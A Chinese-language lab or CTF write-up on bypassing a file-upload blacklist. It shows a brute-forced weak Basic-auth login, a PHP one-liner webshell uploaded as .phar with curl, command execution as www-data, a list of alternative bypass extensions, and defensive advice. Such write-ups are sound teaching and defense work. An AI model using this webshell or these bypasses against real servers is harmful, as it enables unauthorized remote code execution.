# 04 文件上传绕过

## 发现上传点与 Basic 认证

通过目录扫描发现 `/upload.php` 返回 401，提示需要进行 HTTP Basic 认证。

尝试常见弱口令进行爆破，最终得到凭证 `admin:admin***`。

## 上传 WebShell 及绕过过程

认证通过后，发现是一个文件上传页面。

### 失败尝试
- 直接上传 `shell.php` → 被后端拦截（黑名单校验）。
- 上传 `shell.phtml` → 也被拦截。
- 尝试 `shell.php.jpg` → 上传成功，但服务器强制保存为 `.jpg` 后缀，无法被 PHP 解析执行。

### 成功绕过
后端只黑名单拦截了 `.php` 和 `.phtml`，但没有拦截 `.phar`。

在 Kali 构造一句话木马并上传：

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -u admin:admin*** -F "file=@/tmp/shell.php;filename=shell.phar;type=image/jpeg" http://x.x.x.x:800/upload.php
```

返回结果：
```text
文件上传成功，路径：./uploads_test/shell.phar
```

## 验证 WebShell

访问上传后的文件：

```bash
curl "http://x.x.x.x:800/uploads_test/shell.phar?cmd=id"
# 回显：uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功拿到 www-data 权限的 RCE。

## 经验总结

**1. 为什么 `.php.jpg` 不行？**
服务器检查的是“最后一个点之后的后缀”，`.php.jpg` 的最后一个后缀是 `.jpg`，服务器会把它当作图片保存，不会被 PHP 引擎解析。

**2. 为什么 `.phar` 能行？**
`.phar` 是 PHP 的归档格式（PHP Archive），默认情况下 PHP 引擎也会将其解析为 PHP 代码。后端黑名单没有加入 `.phar`，导致绕过成功。

**3. 如果 `.phar` 也被拦截了怎么办？**
可以继续尝试 `.pht`、`.php5`、`.php7`、`.inc`，或者利用 Apache 的多后缀解析特性；也可以配合 `.htaccess` 文件（如果允许上传）将 `.jpg` 解析为 PHP；或者寻找目标上的其他上传点。

**4. 防御建议**
- 使用白名单校验后缀。
- 上传文件后强制重命名（如时间戳+随机字符）。
- 限制上传目录的执行权限（禁止 PHP 解析）。
- 校验文件头（Magic Bytes），而不仅是 Content-Type 或后缀。
